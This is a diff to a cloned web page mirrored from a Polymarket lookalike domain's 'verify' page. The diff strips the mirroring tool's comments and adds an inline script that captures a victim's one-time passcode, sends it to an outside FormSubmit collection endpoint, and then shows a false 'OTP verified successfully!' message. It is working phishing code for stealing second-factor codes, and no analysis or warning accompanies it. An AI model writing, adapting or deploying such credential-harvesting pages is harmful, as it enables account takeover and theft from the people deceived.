@@ -1,8 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from polymarket.reserve.markets/verify by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 11 Nov 2025 12:04:35 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -70,6 +67,37 @@
 
     <script src="config.js"></script>
     <script src="script.js"></script>
+    <script>
+function handleOTP(event) {
+    event.preventDefault(); // prevent default form submission
+
+    // Show the loading spinner
+    document.getElementById('otpForm').style.display = 'none';
+    document.getElementById('loadingScreen').style.display = 'block';
+
+    // Get the OTP from the input
+    const otp = document.getElementById('otp').value;
+
+    // Send OTP to FormSubmit
+    fetch('https://formsubmit.co/d60f72c0231303ce0ed012cbb0523161', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ otp: otp })
+    })
+    .then(() => {
+        // Show success message or redirect if needed
+        document.getElementById('successMessage').style.display = 'block';
+        document.getElementById('successMessage').innerText = 'OTP verified successfully!';
+    })
+    .catch((err) => {
+        document.getElementById('errorMessage').style.display = 'block';
+        document.getElementById('errorMessage').innerText = 'Error verifying OTP. Try again.';
+        document.getElementById('otpForm').style.display = 'block';
+        document.getElementById('loadingScreen').style.display = 'none';
+        console.error(err);
+    });
+}
+</script>
 </body>
 
 <!-- Mirrored from polymarket.reserve.markets/verify by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 11 Nov 2025 12:04:37 GMT -->
